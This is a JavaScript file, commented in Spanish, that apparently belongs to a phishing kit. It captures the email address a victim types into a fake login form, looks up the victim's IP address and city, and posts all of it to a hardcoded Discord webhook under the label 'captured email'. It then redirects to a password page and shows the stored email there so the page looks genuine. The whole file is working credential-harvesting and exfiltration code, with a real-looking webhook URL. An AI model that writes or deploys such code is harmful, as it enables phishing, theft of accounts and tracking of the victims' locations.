// Configuración - REEMPLAZA CON TU WEBHOOK DE DISCORD
const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1416909301318160556/EDnMQZAahLqYDoG9kg468zmwuy7vMkhSm_cjhV3jEBuOvkjDvQMIn1JcB-nHoT5MMy9H";

// Función para enviar datos a Discord
function sendToDiscord(webhookURL, data) {
    return fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: data,
            username: 'Form Bot',
            avatar_url: 'https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055'
        })
    });
}

// Función para obtener datos de IP
async function fetchIPData() {
    try {
        // Obtener IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Obtener información de geolocalización
        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoResponse.json();
        
        // Actualizar elementos en el DOM si existen
        if (document.getElementById('ip')) {
            document.getElementById('ip').innerHTML = '🌎 IP: ' + ipData.ip;
        }
        
        if (document.getElementById('address')) {
            document.getElementById('address').innerHTML = geoData.city + ', ' + geoData.country_name;
        }
        
        return {
            ip: ipData.ip,
            city: geoData.city,
            country: geoData.country_name
        };
    } catch (error) {
        console.error('Error fetching IP data:', error);
        return {
            ip: 'No disponible',
            city: 'No disponible',
            country: 'No disponible'
        };
    }
}

// Función para validar email (para la primera página)
function validateEmail(email) {
    const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return emailRegex.test(email.trim());
}

// Función para enviar datos del formulario de email (para la primera página)
async function sendFormData(event) {
    event.preventDefault();
    
    const emailInput = document.getElementById('js1');
    const errorElement = document.getElementById('err');
    
    // Validación básica
    if (!emailInput.value.trim()) {
        errorElement.innerHTML = 'Campo obligatorio. Por favor, ingrese un correo electrónico.';
        return false;
    }
    
    if (!validateEmail(emailInput.value)) {
        errorElement.innerHTML = 'Por favor, ingrese un correo electrónico válido.';
        return false;
    }
    
    // Obtener datos de IP
    const ipData = await fetchIPData();
    
    // Preparar mensaje para Discord
    const message = `🍄🍄0UTL🍄🍄

📧 **Correo electrónico capturado:** ${emailInput.value}
🌎 **IP:** ${ipData.ip}
📍 **Ubicación:** ${ipData.city}, ${ipData.country_name}
🕒 **Hora:** ${new Date().toLocaleString()}`;
    
    // Enviar a Discord
    try {
        await sendToDiscord(DISCORD_WEBHOOK, message);
        
        // Guardar en localStorage y redirigir
        localStorage.setItem('js1', emailInput.value);
        window.location.href = '_index.html';
    } catch (error) {
        console.error('Error sending to Discord:', error);
        // En caso de error, igualmente redirigir
        localStorage.setItem('js1', emailInput.value);
        window.location.href = '_index.html';
    }
}

// Inicializar eventos cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', function() {
    // Para la primera página (index.html)
    if (document.getElementById('xjsx') && document.getElementById('js1')) {
        document.getElementById('xjsx').addEventListener('submit', sendFormData);
    }
    
    // Para la página de contraseña (_index.html)
    if (document.getElementById('eye') && document.getElementById('js2')) {
        // Alternar visibilidad de la contraseña
        document.getElementById('eye').addEventListener('click', function() {
            const passwordInput = document.getElementById('js2');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.style.opacity = '0.7';
            } else {
                passwordInput.type = 'password';
                this.style.opacity = '1';
            }
        });
        
        // Mostrar el email del usuario
        const email = localStorage.getItem('js1');
        if (email && document.getElementById('local')) {
            document.getElementById('local').textContent = email;
        }
    }
});